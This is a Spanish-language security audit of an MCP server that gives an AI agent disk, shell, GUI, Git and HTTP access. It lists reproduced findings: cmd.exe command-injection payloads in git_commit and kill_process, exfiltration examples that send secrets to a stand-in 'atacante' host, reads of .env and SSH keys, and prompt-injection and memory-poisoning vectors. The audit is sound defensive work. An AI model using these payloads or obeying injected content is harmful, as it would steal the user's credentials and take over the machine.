# AUDIT.md — Auditoría de línea base de Jericho / Jericho

**Commit auditado:** `ad48abb` (rama `main`, árbol limpio)
**Fecha:** 2026-08-15
**Alcance:** todo el servidor MCP (`src/`), scripts de arranque, pruebas y documentación.
**Método:** lectura de código + ejecución real de la suite existente + sondas de explotación reproducibles.

> Todo lo marcado como **CONFIRMADO** se reprodujo ejecutando código en esta máquina.
> Lo marcado como **NO REPRODUCIDO** se investigó y no se pudo demostrar; se documenta igualmente
> porque el patrón es frágil, pero no se cuenta como vulnerabilidad probada.

---

## 0. Línea base ejecutada

| Comprobación | Comando | Resultado real |
|---|---|---|
| Suite existente | `npm test` (`tests/audit-all-tools.js`) | **29/29 PASS**, 0 FAIL |
| Versión Node | `node --version` | v24.19.0 (`engines: >=18`) |
| SDK MCP | `@modelcontextprotocol/sdk` | **1.30.0** — soporta protocolo `2025-11-25`, `2025-06-18`, `2025-03-26`, `2024-11-05`, `2024-10-07` |
| Transporte | `src/index.js` | **solo stdio** (`StdioServerTransport`). El binario `bin/tunnel-client.exe` (OpenAI) lo lanza como subproceso |
| Superficie | inventario | **45 herramientas** (el README dice "40") |
| Payload `tools/list` | medido | **22.058 bytes ≈ 5.962 tokens** enviados al modelo en cada sesión |
| Herramientas con `annotations` | inventario | **0 / 45** |
| Herramientas con `outputSchema` | inventario | **0 / 45** |
| Herramientas con `additionalProperties: false` | inventario | **0 / 45** |
| Pruebas negativas / de seguridad | inventario | **0** |

**Conclusión de la línea base:** el "100% PASS" de la suite existente mide únicamente el camino feliz.
No existe ni una sola prueba que intente hacer algo prohibido, así que el resultado no aporta
evidencia sobre la seguridad del sistema.

---

## 1. Inventario de herramientas (45)

Leyenda de riesgo propuesta: **R0** lectura local segura · **R1** cambio reversible dentro del proyecto ·
**R2** efecto externo o difícil de revertir · **R3** destructivo/credenciales/Git remoto/sistema · **R4** privilegio general.

`Aprob.` = ¿debería requerir aprobación explícita? · `Roll.` = ¿tiene rollback?

### 1.1 `task_engine` (5)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `get_agent_protocol` | R | local | no | sí | — | no | no | no | R0 | no | ninguno | n/a |
| `list_pending_tasks` | R | local | no | sí | `workspace/.tasks/**` | no | no | no | R0 | no | ninguno | n/a |
| `resume_task_session` | R | local | no | sí | `.tasks/**` + **cualquier ruta** listada en `relevantFiles` | **sí (lee archivos arbitrarios)** | no | no | R1 | no | ninguno | n/a |
| `save_or_update_task` | W | local | **sí (sobrescribe la hoja entera)** | no | `.tasks/**` | no | no | no | R1 | no | ninguno | **no** |
| `memory_bank` | R/W | local | **sí (`update_section` reemplaza todo)** | no | `.context/` | no | no | no | **R3** | **sí** | ninguno | **no** |

### 1.2 `vision_gui` (10)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `take_screenshot` | R | local | no | no | escribe en **cualquier** `savePath` | **sí (captura pantallas con secretos)** | no | no | R2 | sí | ninguno | n/a |
| `mouse_click` | W | **externo (SO)** | posible | no | — | no | no | no | R2 | sí | ninguno | **no** |
| `mouse_move` | W | externo | no | sí | — | no | no | no | R1 | no | ninguno | no |
| `mouse_drag` | W | externo | posible | no | — | no | no | no | R2 | sí | ninguno | **no** |
| `mouse_scroll` | W | externo | no | no | — | no | no | no | R1 | no | ninguno | no |
| `type_text` | W | **externo (SO)** | **sí** | no | — | **sí (puede teclear secretos)** | no | no | **R3** | **sí** | ninguno | **no** |
| `press_hotkey` | W | externo | **sí** | no | — | no | no | no | **R3** | **sí** | ninguno | **no** |
| `get_screen_metrics` | R | local | no | sí | — | no | no | no | R0 | no | ninguno | n/a |
| `list_windows` | R | local | no | sí | — | **sí (títulos con datos)** | no | no | R1 | no | ninguno | n/a |
| `focus_window` | W | externo | no | no | — | no | no | no | R1 | no | ninguno | no |

### 1.3 `terminal` (6)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `run_command` | W | **arbitrario** | **sí** | no | **todo el disco** | **sí (hereda `process.env` completo)** | **sí (sin restricción)** | hereda del proceso | **R4** | **sí** | 60 s (config) | **no** |
| `run_background_command` | W | **arbitrario** | **sí** | no | **todo el disco** | **sí** | **sí** | hereda | **R4** | **sí** | **ninguno (sin TTL)** | **no** |
| `get_background_task_output` | R | local | no | sí | — | **sí (logs sin redactar)** | no | no | R1 | no | ninguno | n/a |
| `kill_background_task` | W | externo | sí | sí | — | no | no | no | R2 | no | ninguno | no |
| `list_background_tasks` | R | local | no | sí | — | **sí (líneas de comando sin redactar)** | no | no | R1 | no | ninguno | n/a |
| `get_environment_vars` | R | local | no | sí | — | **sí (enmascarado por nombre, evadible)** | no | no | **R3** | sí | ninguno | n/a |

### 1.4 `filesystem` (7)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `read_file` | R | local | no | sí | **todo el disco** | **sí (lee `.env`, `.ssh`, `AppData`)** | no | no | **R3** | sí | ninguno | n/a |
| `write_file` | W | local | **sí (sobrescribe sin backup)** | no | **todo el disco** | no | no | no | **R3** | **sí** | ninguno | **no** |
| `edit_file_replace` | W | local | sí | **no (reemplaza la 1ª de N)** | **todo el disco** | no | no | no | R2 | sí | ninguno | **no** |
| `search_files` | R | local | no | sí | **todo el disco** | no | no | no | R1 | no | ninguno | n/a |
| `grep_in_files` | R | local | no | sí | **todo el disco** | **sí (grep de `.env`)** | no | no | **R3** | sí | ninguno | n/a |
| `get_directory_tree` | R | local | no | sí | **todo el disco** | no | no | no | R1 | no | ninguno | n/a |
| `file_operations` | W | local | **sí (`delete` recursivo `force`)** | no | **todo el disco** | no | no | no | **R3** | **sí** | ninguno | **no** |

### 1.5 `context_checkpoints` (5)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `save_context_checkpoint` | W | local | no | no | `data/checkpoints/` | posible (campo `metadata` libre) | no | no | R1 | no | ninguno | n/a |
| `load_context_checkpoint` | R | local | no | sí | `data/checkpoints/` | posible | no | no | R1 | no | ninguno | n/a |
| `list_context_checkpoints` | R | local | no | sí | `data/checkpoints/` | no | no | no | R0 | no | ninguno | n/a |
| `store_memory` | W | local | sí (sobrescribe por clave) | no | `data/` | posible | no | no | R1 | no | ninguno | **no** |
| `recall_memory` | R | local | no | sí | `data/` | posible | no | no | R1 | no | ninguno | n/a |

### 1.6 `git_dev` (5)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `git_status` | R | local | no | sí | cualquier repo | no | no | no | R0 | no | ninguno | n/a |
| `git_diff` | R | local | no | sí | cualquier repo | **sí (diffs con secretos)** | no | no | R1 | no | ninguno | n/a |
| `git_log` | R | local | no | sí | cualquier repo | no | no | no | R0 | no | ninguno | n/a |
| `git_commit` | W | local | sí | no | cualquier repo | no | no | no | **R2** | sí | ninguno | `git reset` |
| `git_branch` | W | local | **sí (`delete`)** | no | cualquier repo | no | no | no | R2 | sí | ninguno | parcial |

### 1.7 `system_process` (4)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `get_system_health` | R | local | no | sí | — | no | no | no | R0 | no | ninguno | n/a |
| `list_processes` | R | local | no | sí | — | **sí (líneas de comando)** | no | no | R1 | no | ninguno | n/a |
| `kill_process` | W | **externo (SO)** | **sí (cualquier PID)** | no | — | no | no | no | **R3** | **sí** | ninguno | **no** |
| `open_app_or_url` | W | **externo** | sí | no | — | no | **sí (abre URLs)** | no | **R3** | **sí** | ninguno | **no** |

### 1.8 `network_web` (3)

| Herramienta | R/W | Efecto | Destructiva | Idemp. | Dirs | Secretos | Red | Priv | Riesgo | Aprob. | Timeout | Roll. |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `fetch_web_page` | R | **externo** | no | no | — | no | **sí (cualquier URL)** | no | **R2** | no | **ninguno** | n/a |
| `check_port` | R | externo | no | sí | — | no | **sí (escaneo de puertos)** | no | R2 | no | 3 s | n/a |
| `http_request` | W | **externo** | **sí (POST/DELETE arbitrarios)** | no | — | **sí (cabeceras libres)** | **sí (cualquier URL)** | no | **R3** | **sí** | **ninguno** | **no** |

---

## 2. Hallazgos con evidencia

Reproducción: `node tests/security/legacy-baseline-probe.js` (conservado como evidencia histórica;
apunta a los módulos legacy tal y como estaban en `ad48abb`).

### P0 — Crítico

#### P0-1 · Sin frontera de sistema de archivos: lectura y escritura en todo el disco
**CONFIRMADO.** `sanitizePath()` existe en `src/utils/helpers.js:38` pero **no la usa ningún módulo**.
Todos los módulos hacen `path.resolve(rawPath)` directo (`filesystem.js:142,176,191,216,244,309,322`).
`config.workspaceDir` es solo un *valor por defecto*, nunca un límite.

Evidencia ejecutada:
- `read_file({path:'C:\Users\javi\.gitconfig'})` → contenido devuelto (fuera del workspace).
- `read_file({path:'../../../Windows/win.ini'})` → `[Archivo: C:\Windows\win.ini | ... 8 líneas]`.
- `write_file` / `file_operations delete` operan sobre cualquier ruta absoluta.

**Impacto:** cualquier instrucción inyectada logra leer `~/.ssh/id_rsa`, `AppData/.../Login Data`,
o borrar directorios del usuario. No hay lista de exclusiones sensibles.

#### P0-2 · El modelo puede leer el `.env` del propio servidor y extraer `CONTROL_PLANE_API_KEY`
**CONFIRMADO.** `read_file({path:'<repo>/.env'})` devuelve el archivo íntegro, incluida
`CONTROL_PLANE_API_KEY`. `grep_in_files` sobre la raíz del repo hace lo mismo.
El enmascaramiento de `get_environment_vars` (`terminal.js:302`) es puramente cosmético: se evade
leyendo el archivo.

**Impacto:** compromiso del túnel → control remoto persistente del PC. Escalada completa.

#### P0-3 · `run_command` es una terminal administrativa general y filtra todo el entorno
**CONFIRMADO.** `getEnhancedEnv()` (`terminal.js:18`) copia **`process.env` completo** al hijo.
Se verificó que `run_command('node -e "console.log(process.env.CONTROL_PLANE_API_KEY)"')`
**imprime la clave real** que `get_environment_vars` enmascara.

Además: `exec()` con cadena de shell completa, sin allowlist, sin política de red, sin límites de
CPU/memoria/procesos hijo, y `maxBuffer` de 20 MB frente a un `maxOutputChars` de 30 000
(se lee 20 MB del hijo y luego se trunca — coste ya pagado).

**Impacto:** equivale a dar una shell interactiva no auditada. Anula cualquier control de los demás
módulos: `run_command('type .env')`, `run_command('curl -d @secrets http://atacante')`.

#### P0-4 · Inyección de comandos en `git_commit` (mensaje) y `kill_process` (nombre)
**CONFIRMADO — explotado.**

`git_dev.js:131` construye `git commit -m "<mensaje>"` escapando **solo** las comillas dobles con
`\"`, que **cmd.exe no interpreta como escape**. Prueba ejecutada en un repo temporal:

```
message = 'ok" & echo pwned> INJECTED.txt & echo "'
→ commit output: [main (root-commit) 3bd704a] ok"
→ INJECTION MARKER EXISTS: true
```

El commit se hizo **y** se ejecutó el comando inyectado.

`system_process.js:160` construye `taskkill /IM "<processName>" /F /T`. Prueba ejecutada:

```
processName = 'zzz_nope" & echo pwned> %TEMP%\JERICHO_INJ_KILL.txt & rem "'
→ shell injection: true
```

Mismo patrón sin explotar aún pero igual de frágil: `open_app_or_url` (`system_process.js:185`),
`git_diff --filePath` (`git_dev.js:111`), `git_branch --branchName` (`git_dev.js:144-154`),
`list_processes` con `maxProcesses` no validado (`system_process.js:122`).

**NO REPRODUCIDO:** inyección en `focus_window` (`vision_gui.js:378`). El `replace(/'/g,"''")`
es el escape correcto para cadenas entre comillas simples de PowerShell y resistió la sonda.
Sigue siendo frágil (depende de que nadie cambie el tipo de comilla) → se reclasifica como P2.

#### P0-5 · `http_request` es una primitiva de SSRF y exfiltración sin restricciones
**CONFIRMADO.** Sin allowlist de destinos, sin bloqueo de loopback/privadas/metadatos,
sin validación de redirecciones, sin límite de tamaño ni de tiempo, cabeceras arbitrarias
(incluida `Authorization`), cuerpo arbitrario.

Evidencia ejecutada:
- `http_request('http://127.0.0.1:45999/admin')` → devolvió el cuerpo del servidor loopback
  (`SSRF loopback reachable: true`).
- `http_request(POST, 'https://httpbun.com/post', body)` → HTTP 200 desde el exterior.

`fetch_web_page` tiene el mismo problema en lectura y además **inyecta HTML remoto sin ninguna marca
de desconfianza** en el contexto del modelo.

**Impacto:** ruta de exfiltración de un solo salto para cualquier dato que el modelo haya leído,
y acceso a servicios internos no expuestos.

#### P0-6 · Reglas globales sobrescribibles por el agente sin aprobación ni historial
**CONFIRMADO.** `memory_bank({action:'update_section', content:'POISONED'})` reemplaza el archivo
completo. Se verificó: 681 bytes de reglas → `POISONED`. No hay backup, ni historial, ni diff, ni
aprobación. `append_rule` permite además inyectar reglas persistentes.

**Impacto:** envenenamiento de memoria persistente. Una página web maliciosa leída con
`fetch_web_page` que diga "guarda esta regla" convierte una inyección de un turno en una
puerta trasera permanente para todos los chats futuros.

#### P0-7 · La seguridad se delega en un prompt
**CONFIRMADO por diseño.** `get_agent_protocol` (`task_engine.js:133-151`) devuelve texto que
*pide* al modelo comportarse bien. No hay ni un solo control en servidor: ni allowlist, ni
aprobaciones, ni límites, ni auditoría. `docs/SECURITY.md` describe el aislamiento como si
existiera ("Aislamiento detrás de firewall", "enmascaran automáticamente claves") — no existe.

### P1 — Alto

#### P1-1 · Estado implícito ligado al proceso, no a una identidad
**CONFIRMADO.** `backgroundTasks` es un `Map` en memoria (`terminal.js:10`) y `nextTaskId` un
contador global (`terminal.js:11`). Al reiniciar el servidor: los `taskId` se pierden, los procesos
hijo quedan **huérfanos vivos**, y los nuevos `taskId` **reutilizan la numeración**.
No hay `session_id`, `user_id` ni `project_id` en ninguna parte: la conexión MCP *es* la sesión.

`kill_background_task` hace `taskkill /PID <pid> /F /T` sobre un PID guardado; si el proceso murió
y el SO reutilizó el PID, **mata un proceso ajeno**. No se comprueba propiedad ni hora de inicio.

#### P1-2 · Sin control de concurrencia: dos chats se pisan silenciosamente
**CONFIRMADO.** `save_or_update_task` hace `fs.writeFileSync` del documento entero
(`task_engine.js:494`). Prueba: chat-1 escribe `objective: 'chat-1 work'`, chat-2 escribe
`objective: 'chat-2 work'` → el resultado final contiene solo el de chat-2, sin aviso ni conflicto.
No hay `revision`, ni compare-and-swap, ni lease, ni historial.

#### P1-3 · Una tarea se marca COMPLETED sin ninguna evidencia
**CONFIRMADO.** `save_or_update_task({status:'COMPLETED'})` sin criterios de aceptación, sin
checklist, sin pruebas ejecutadas → la tarea aparece como COMPLETED. El "estado" es texto libre
en Markdown parseado con expresiones regulares frágiles (`task_engine.js:74-81`), lo que además
permite que **contenido de un archivo** altere el estado percibido de una tarea.

#### P1-4 · Edición ambigua silenciosa
**CONFIRMADO.** `edit_file_replace` usa `String.replace(targetText, ...)`, que sustituye
**solo la primera** de N coincidencias idénticas sin avisar. Prueba: archivo `X\nX\n`,
reemplazo `X`→`Y` → resultado `Y\nX\n`. No hay hash previo, ni dry-run, ni detección de
modificación concurrente del archivo, ni rollback.

#### P1-5 · Sin escritura atómica en ningún punto
**CONFIRMADO por inspección.** `write_file`, `save_or_update_task`, `store_memory`,
`save_context_checkpoint` y `memory_bank` usan `fs.writeFileSync` directo sobre el destino.
Un fallo a mitad de escritura deja el archivo **truncado**. Para `long_term_memory.json` y
`MEMORY_BANK.md` eso significa pérdida total de la memoria persistente (`loadMemories()`
devuelve `[]` silenciosamente ante JSON corrupto, `context_checkpoints.js:17`).

#### P1-6 · Superficie de herramientas excesiva y sin metadatos
**CONFIRMADO.** 45 herramientas, todas en un único perfil, ≈5.962 tokens de esquema en cada
sesión. 0/45 con `annotations` (el cliente no puede saber qué es destructivo), 0/45 con
`outputSchema`/`structuredContent`, 0/45 con `additionalProperties:false`.
Se aceptan alias no declarados (`args.targetPath`, `args.file` en `filesystem.js:139`), es decir,
el esquema publicado **no describe** lo que el servidor acepta.

#### P1-7 · Contenido no fiable entra sin marcar
**CONFIRMADO por inspección.** `fetch_web_page` convierte HTML remoto a Markdown y lo devuelve
como texto plano indistinguible de una instrucción del usuario. Lo mismo con `read_file`,
`grep_in_files`, `list_windows` (títulos de ventana), `get_background_task_output` (stdout de
procesos) y `resume_task_session` (previsualiza hasta 4 archivos del disco). Ninguno delimita el
contenido ni lo etiqueta como datos.

### P2 — Medio

- **P2-1 · Errores silenciados.** `catch (e) {}` vacíos en `filesystem.js:293`,
  `task_engine.js:296,398,415`, `context_checkpoints.js:165,194`. Un fallo de lectura se
  presenta como "sin coincidencias".
- **P2-2 · Fuga de secretos en logs.** `logger.info('Llamada a herramienta', {args})`
  (`index.js:60`) serializa **todos los argumentos** — incluidas cabeceras `Authorization` de
  `http_request` y textos de `type_text` — sin redacción. `initFileLogging` existe pero
  nunca se invoca, así que hoy va a stderr; en cuanto se active el fichero, los secretos quedan en disco.
- **P2-3 · `focus_window` con escape frágil.** Ver P0-4; escapado correcto hoy, sin pruebas que lo fijen.
- **P2-4 · Sin límites de recursos.** Ningún timeout en herramientas de red ni GUI; sin límite de
  CPU/memoria/hijos; `run_background_command` sin TTL.
- **P2-5 · `take_screenshot` sin redacción ni recorte.** Captura la pantalla completa (gestor de
  contraseñas incluido si está abierto) y la envía como PNG base64 sin reducción de tamaño.
- **P2-6 · GUI no determinista.** `mouse_click(x,y)` sin precondiciones: no verifica proceso,
  ventana, título, geometría ni antigüedad de la última observación. Entre la captura y el clic la
  ventana puede haber cambiado → **clic sobre la ventana equivocada**. `type_text` puede teclear
  en cualquier cosa que tenga el foco.
- **P2-7 · Sin auditoría.** No existe diario de operaciones, ni `trace_id`, ni métricas, ni
  circuit breaker, ni exportación. Tras un incidente no se puede reconstruir qué pasó.
- **P2-8 · El panel local de `http://127.0.0.1:8080/ui`** que anuncian `start.bat:24`, `start.sh:20`
  y `docs/SECURITY.md` **no está implementado en este repositorio**: lo sirve el binario propietario
  `bin/tunnel-client.exe`. No podemos auditar su autenticación, CSRF ni validación de `Origin`/`Host`.
  → Se documenta como riesgo residual fuera de nuestro control, no como hallazgo corregible aquí.

### P3 — Bajo / deuda

- **P3-1 · Documentación divergente.** README anuncia "40 herramientas" (son 45), "Amnesia Cero"
  y "Modo 100% Invisible" sin definición medible ni prueba. `docs/SECURITY.md` describe
  protecciones inexistentes.
- **P3-2 · Sin versionado de herramientas ni de esquemas.** `index.js` declara `version: '1.2.0'`
  mientras `package.json` dice `1.0.0`, y el nombre del servidor (`openpc-mcp-suite`) no coincide
  con la marca (`jericho`).
- **P3-3 · Sin negociación explícita de capacidades.** Solo se declara `capabilities: { tools: {} }`;
  no se usan Resources, Prompts ni la extensión Tasks pese a que el SDK 1.30.0 los soporta.
- **P3-4 · `install-autostart.bat` fomenta ejecutar el servidor elevado**, lo que convierte
  `run_command` en R4 permanente.
- **P3-5 · Dependencias.** 8 directas. `@nut-tree-fork/nut-js` es un *fork* de un proyecto cuyo
  original cambió de licencia; `screenshot-desktop` invoca binarios del sistema. Ninguna está
  fijada a una versión exacta (todas con `^`).

---

## 3. Estado implícito identificado

| Estado | Dónde | Ligado a | Problema |
|---|---|---|---|
| `backgroundTasks` | `terminal.js:10` | proceso del servidor | se pierde al reiniciar; procesos quedan huérfanos |
| `nextTaskId` | `terminal.js:11` | proceso del servidor | IDs reutilizados tras reinicio |
| "sesión" | implícito | **conexión MCP** | viola la regla de no usar la conexión como identidad |
| "proyecto activo" | implícito | último `mtime` en `.tasks` (`task_engine.js:371`) | dos chats compiten por el mismo "activo" |
| `config.workspaceDir` | `config.js:19` | variable de entorno | no es una frontera, solo un valor por defecto |
| `mouse`/`keyboard` de nut-js | `vision_gui.js:12` | proceso | estado global del escritorio compartido entre chats |
| `process.env` | proceso | proceso | se propaga íntegro a cada hijo |

## 4. Rutas de exfiltración

1. `read_file`/`grep_in_files` sobre `.env`, `~/.ssh`, `AppData` → contexto del modelo. **(P0-1, P0-2)**
2. `run_command` con `curl`/`Invoke-WebRequest` → cualquier host. **(P0-3)**
3. `http_request` POST con cuerpo arbitrario → cualquier host. **(P0-5)**
4. `take_screenshot` de pantalla completa → base64 al modelo. **(P2-5)**
5. `get_background_task_output` / `list_processes` / `list_windows` → líneas de comando y títulos con tokens.
6. `git_diff` de un commit que contenga secretos.
7. `open_app_or_url('https://atacante/?d=<datos>')` → navegador del usuario.
8. Logs de `index.js:60` si se activa `initFileLogging`.

## 5. Rutas de escalada de privilegios

1. Ejecutar el servidor elevado (`install-autostart.bat`) → todo hijo de `run_command` es admin.
2. Robo de `CONTROL_PLANE_API_KEY` vía `read_file` → control del túnel desde fuera. **(P0-2)**
3. Inyección en `git_commit`/`kill_process` → ejecución con los privilegios del servidor. **(P0-4)**
4. `write_file` sobre una carpeta de autoarranque o un script del propio repo → persistencia.
5. `memory_bank` envenenado → el propio agente ejecuta el ataque en sesiones futuras. **(P0-6)**

## 6. Riesgos de prompt injection

| Vector | Herramienta | Estado |
|---|---|---|
| Página web maliciosa | `fetch_web_page` | sin marcar, sin sandbox |
| README/comentarios de un repo | `read_file`, `resume_task_session` | sin marcar |
| Salida de un proceso | `get_background_task_output` | sin marcar |
| Título de ventana | `list_windows` | sin marcar |
| Hoja de tarea `.md` | `resume_task_session` | **el estado se parsea del texto**, un archivo puede fingir `**Estado**: COMPLETED` |
| Memory bank envenenado | `memory_bank read_all` | se presenta como regla de sistema |
| Respuesta de API | `http_request` | sin marcar |

## 7. Problemas de concurrencia

1. Dos chats escribiendo la misma hoja → último gana, sin aviso **(P1-2, CONFIRMADO)**.
2. Dos chats en la misma rama Git → `git_commit` con `add -A` mezcla trabajo ajeno.
3. `taskId` reutilizado tras reinicio → un chat consulta/mata la tarea de otro **(P1-1)**.
4. Estado GUI global: dos chats moviendo el mismo ratón.
5. `long_term_memory.json`: lectura-modificación-escritura sin bloqueo → pérdida de escrituras.

---

## 8. Resumen de prioridades

| ID | Título | Prioridad | Estado |
|---|---|---|---|
| P0-1 | Sin frontera de sistema de archivos | P0 | CONFIRMADO |
| P0-2 | `.env` del servidor legible por el modelo | P0 | CONFIRMADO |
| P0-3 | `run_command` = terminal admin + fuga de entorno | P0 | CONFIRMADO |
| P0-4 | Inyección de comandos (`git_commit`, `kill_process`) | P0 | CONFIRMADO (explotado) |
| P0-5 | SSRF / exfiltración vía `http_request` | P0 | CONFIRMADO |
| P0-6 | Reglas globales sobrescribibles sin aprobación | P0 | CONFIRMADO |
| P0-7 | Seguridad delegada al prompt | P0 | CONFIRMADO |
| P1-1 | Estado implícito ligado al proceso / PID reutilizado | P1 | CONFIRMADO |
| P1-2 | Sin control de concurrencia | P1 | CONFIRMADO |
| P1-3 | COMPLETED sin evidencia | P1 | CONFIRMADO |
| P1-4 | Edición ambigua silenciosa | P1 | CONFIRMADO |
| P1-5 | Sin escritura atómica | P1 | CONFIRMADO |
| P1-6 | Superficie de 45 herramientas sin metadatos | P1 | CONFIRMADO |
| P1-7 | Contenido no fiable sin marcar | P1 | CONFIRMADO |
| P2-1..8 | Errores silenciados, logs, límites, GUI, auditoría, panel | P2 | ver detalle |
| P3-1..5 | Documentación, versionado, capacidades, autostart, deps | P3 | ver detalle |
